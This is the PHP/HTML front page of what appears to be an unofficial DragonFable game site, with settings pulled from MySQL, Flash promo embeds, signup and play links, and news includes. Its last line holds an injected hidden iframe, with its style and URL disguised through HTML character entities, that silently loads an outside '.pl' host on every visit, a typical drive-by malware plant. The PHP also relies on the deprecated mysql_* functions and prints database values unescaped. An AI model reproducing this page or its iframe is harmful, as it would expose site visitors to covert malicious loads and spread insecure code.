<?php
include ("includes/config.php");
$query = mysql_query("SELECT * FROM df_settings LIMIT 1");
$fetch = mysql_fetch_assoc($query);
$promo = $fetch['promo'];
$sitename = $fetch['DFSitename'];
$skin = $fetch["backgrondSkin"];
$facebook = $fetch["FaceBookUsername"];
$myspace = $fetch["MySpaceUsername"];
$time = date(" g:i:s A ");
session_start();
	if(isset($_SESSION['user'])){
		header('location: index.php');
	} else {
		include ("includes/mysql_connector.php");
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title><?php echo $sitename; ?> - Play a free RPG in a 2D online fantasy game world</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<meta name="author" content="Artix Entertainment,LLC" />
<link href="includes/dragonfable.css" rel="stylesheet" type="text/css" />
<meta name="description" content="<?php echo $sitename; ?> is a free fantasy RPG that you can play online in your web browser. No downloads are required to train your dragon or play this game!" />
<meta name="keywords" content="<?php echo $sitename; ?>, AdventureQuest, RPG, Web, Game, Dragon, Flash" />
<style type="text/css">
<!--
body   {background: #000000 url(<?php echo $skin; ?>) no-repeat fixed top center;}
#skin-wrap {
	position: absolute;
	width: 1600px;
	top: 0px;
	left: 50%;
	margin-left: -800px;
}
#main-content {
	position: absolute;
	width: 950px;
	top: 0px;
	left: 50%;
	margin-left: -475px;
}
.playnow {
	width: 200px;
	height: 4000px;
	float: right;
	display: block;
	margin: 10px 100px 0px 0px;
}
.style1 {
	font-family: Arial, Helvetica, sans-serif
}
.style2 {
	font-size: 13px;
	font-weight: bold;
}
.style3 {
	font-size: 9px;
	font-weight: Italic;
}
.style6 {
	font-size: 18px;
	color: #FFFF00;
	font-weight: bold;
}
.style7 {
	color: #990000;
	font-style: italic;
}
.style8 {color: #330066}
.style9 {
	color: #FFFFFF;
	font-size: 12px;
}
.style10 {font-size: 18px}
-->
</style>
<script src="includes/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<!-- Header -->
<script src="includes/AC_RunActiveContent.js" type="text/javascript"></script>
<table border="0" align="center" cellpadding="2" cellspacing="0">
  <tr>
    <td bgcolor="#000000" valign="top"><table width="750" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="225" align="left" valign="top" class="tdbg" id="menu">
        <!--Navigation -->
		<?php include_once "sidebar.php"; ?></td>
        <td width="525" align="left" valign="top" class="tdbg">
			<table width="525" border="0" cellspacing="0" cellpadding="0">
				<tr>
				  <td colspan="2" align="right" bgcolor="#660000"><img src="images/clear.gif" width="400" height="60"z></td>
			  </tr>
              <tr>
				  <td colspan="2" class="tdtrim"><img src="images/clear.gif" height="2"></td>
			  </tr>
				<tr>
				  <td height="25" align="right" valign="middle"><img src="images/clear.gif" width="1" height="25" align="left"></td>
				 <td align="right" valign="middle"><span class="server"><strong class="style2">Server Status:</strong> <font color=white>Online</font>. &nbsp;&nbsp;&nbsp;<strong class="style2">[<?php echo $time; ?>] &nbsp;</strong>
<?php
	if(isset($_SESSION['name'])){
		$name = $_SESSION['name'];
		echo "<strong class=\"style2\"> Logout: [ </strong><a href=\"logout.php\">".$name."</a><strong class=\"style2\"> ]</strong>";
	}
?></span><br /></td>
				</tr>              
            </table>
			<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" id="FFable" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="525" height="250" align="middle">
        <param name="allowScriptAccess" value="sameDomain" />
        <param name="movie" value="flash/<?php echo $promo; ?>" />
        <param name="menu" value="false" />
	<param name="allowFullScreen" value="true" />

        <param name="bgcolor" value="#000000" />
        <embed src="flash/<?php echo $promo; ?>" name="FFable" bgcolor="#000000" menu="false"  allowFullScreen="true" width="525" height="250" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" swLiveConnect="true" />
      </object>
			<noscript>
			<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" 
				codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" 
				width="525" height="250" align="middle">
              <param name="allowScriptAccess" value="sameDomain" />
              <param name="movie" value="flash/<?php echo $promo; ?>" />
              <param name="menu" value="false" />
              <param name="quality" value="high" />
              <param name="wmode" value="opaque" />
              <param name="scale" value="exactfit" />
              <param name="bgcolor" value="#330000" />
			  <param name="FlashVars" value="strHeaderTitle="/>
              <embed src="flash/<?php echo $promo; ?>" menu="false" quality="high" scale="exactfit" bgcolor="#330000" 
				width="525" height="250" align="middle" allowScriptAccess="sameDomain"
				type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" 
				flashvars="strHeaderTitle=" />
			</object>
			</noscript>
		<table width="525" border="0" cellspacing="0" cellpadding="5">
              <tr>
                <td class="tdbg">&nbsp;</td>
              </tr>
              <tr>
                <td class="tdbg" align="left"><!-- End Header -->
                  <table width="490" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td align="center"><a href="df-signup.php"><img src="images/button-play-freeacount.gif" alt="New Free Account" width="217" height="149" border="0" /></a><br />
                          <a href="df-signup.php">Create a Free Account</a></td>
                      <td align="center"><a href="game/"><img src="images/button-play-elementals.gif" alt="Play <?php echo $sitename; ?>" width="218" height="144" border="0" /></a><br />
                          <a href="game/">Play <?php echo $sitename; ?></a><br />
                          <a class="style3" href="game/?w=475&h=350&f=8"><font color=#C68E17>Tiny</font></a>
						  <a class="style3" href="game/?w=1150&h=840&f=14"><font color=#C68E17>Large</font></a>
						  <a class="style3" href="game/?w=1750&h=1280&f=19"><font color=#C68E17>Huge</font></a></td>
                    </tr>
                  </table>
                  <br />
                  <table width="500" border="0" cellpadding="10" cellspacing="0">
                    <tr>
                      <td align="left" valign="top"><p><span class="style6">What is <?php echo $sitename; ?>?</span><br />
                      <?php echo $sitename; ?> is an animated fantasy RPG (<em>It has Dragons!</em>) that you can <a href="df-signup.php">create a free account</a> and play using your web browser. Each week we (Artix, Cysero, Zhoom, Geo, Alina, Ghost, J6, Thyton, Rolith, and the DF Team) add new original content based on the suggestions of you (hopefully) and your fellow  players as we evolve our ongoing storyline. <?php echo $sitename; ?> is free to play, but if you like what we are doing you can help support the game by upgrading with a  powerful Dragon Amulet unlocking exclusive areas and powerful items.</p>
                      </td>
                    </tr>
                  </table>
                  <table width="500" border="0" cellpadding="10" cellspacing="0">
                    <tr>
                      <td colspan="2"><span class="header"><?php echo $sitename; ?> News<br />
                        <img src="images/linebreak-rpg.gif" width="480" height="1" /></span><br /></td>
                    </tr>
					<?php include "/news.php"; ?>
                    </tr>
                    <tr>
                      <td colspan="2" align="left" valign="top"><p class="style1"><span class="header">More News</span><br>
                          <img src="images/linebreak-rpg.gif" width="95%" height="1" />
						  <br><?php include "/more-news.php"; ?>
                          
                        </td>
                    </tr>
                    <tr>
                      <td colspan="2" align="left" valign="top">
					  <div align="center"><img src="images/promo/promo-eye-rule.gif" width="250" height="200" /></div>
                        <p><span class="header">Account Help <br />
                          <img src="images/linebreak-rpg.gif" width="95%" height="1" /></span><br />
                          If you are a Guardian and having trouble accessing your account, the following
                          should help you get back into the game. Note: No Guardian accounts were deleted!
                          All Beta characters were converted into live characters. </p>
                        <ul>
                          <li><b>Account Manager</b> - Edit your existing account with the <a href="../ucp.php">Account
                            Manager </a></li>
                          <li><b>Lost your Password?</b> - Use the <a href="df-lostpassword.php">Password
                            Recovery</a> page.</li>
                        </ul></td>
                    </tr>
                  </table>
                  <!-- Footer -->
</td>
  </tr>
</table>
</td>
</tr>
<tr>
  <td colspan="2" align="center" class="tdbase"><p align="center"><em>Copyright &copy; 2010 Artix Entertainment, LLC. All Rights Reserved.</em><br />&quot;AdventureQuest&quot;,  &quot;DragonFable&quot;, &quot;MechQuest&quot;, &quot;ArchKnight&quot;, &quot;BattleOn.com&quot;,  &quot;AdventureQuest Worlds&quot;, &quot;Artix Entertainment&quot;<br />and all game  character names are either trademarks or registered trademarks of Artix  Entertainment, LLC. All rights are reserved.</p><br /><br /></td>
</tr>
</table>
</td>
<?php include_once "/right-sidebar.php"; ?>
</tr>
</table>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>